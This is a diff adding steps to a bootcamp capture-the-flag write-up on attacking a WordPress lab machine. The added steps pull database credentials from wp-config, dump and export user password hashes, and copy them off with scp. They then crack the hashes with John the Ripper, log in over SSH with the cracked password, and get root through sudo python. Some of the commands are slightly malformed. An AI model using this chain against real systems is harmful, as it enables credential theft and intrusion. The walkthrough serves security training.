@@ -113,13 +113,90 @@ Next, we are visitting the directory path from the information gained from the p
 
 ![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discovered_flag2.png)
 
-  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
+     - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
 
-- To
+To get flag3, we go by visitting the wp-config to gain the credential of mySql database.
 
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
-  - `flag2.txt`: _TODO: Insert `f
-    - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/sql_credential_in_wp-config.png)
+
+- Now we can access to mysql database using this command.
+
+  ```bash
+  mysql -h localhost -u root -p
+  ```
+## Command Explain 
+
+| Options | Description                                                |
+|---------|------------------------------------------------------------|
+| mysql   | To get access to the mysql database                        |
+| -h      | host name: Connect to the MySQL server on the given host.  |
+| -u      | The MySQL user name to user when connecting to the server. |
+| -p      | The password to use when connecting to the server.         |
+
+- Next we use the sql query to uncover the flag3 location.
+--> show databases; --> use wordpress --> show tables; --> describe wp_users; --> select post_content from wp_posts;
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/using_of_sql_query.png)
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discover_flag_3.png)
+
+  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
+
+To get start with the flag4, we continue to search through the SQL database to find the user password hashes. We use the following query to identify the hashes.
+
+--> describe wp_users; --> select user_login, user_pass from wp_users; 
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discover_user_hash.png)
+
+- Next, we use the query to join the user and hash together.
+
+--> select concat_ws(':', user_login, user_pass) from wp_users:
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/join_two_user_and_hashes.png)
+
+- Now we export the user hashed into a file using this query.
+
+--> select concat_ws(':', user_login, user_pass) from wp_users into outfile '/var/www/html/user_hash.txt
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/hashes_export_to_michael.png)
+
+- Before we begin to crack the hashes, we have to download the file to the host machine using the command:
+
+```bash
+scp michael@192.168.1.110:/var/www/html/user_hash.txt
+```
+***scp command is a secure copy (remote file copy) and can be done either from the host or fromt the remote machine, in the step above we have done using it from the host machine.***
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/scp_from_michael_to_localhost.png)
+
+- Now we are ready to begin cracking the hashes using John the Ripper.
+
+***John the Ripper is a free password cracking software tool.
+
+```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hash.txt
+```
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/using_john_to_crack.png)
+
+- Now we can crack the hashes of user steven, that has been identified as "pink84."
+
+- Next, we ssh into steven using that password we cracked earlier.
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/ssh_to_steven.png)
+
+- We gained access to Steven's workstation successfully, however it appears that Steven did not have root privileges.
+
+- Next we using this command to elevate the root priviledge.
+
+```bash
+sudo /usr/bin/python; import os; os.system('/bin/bash')
+```
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/steven_priv_escalation.png)
+
+- Next, the flag4 can be easily discover under the root directory.
+
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/flag4.png)
+
+So now we are successfully exploited the target1 machine!
+
+# End of Operation
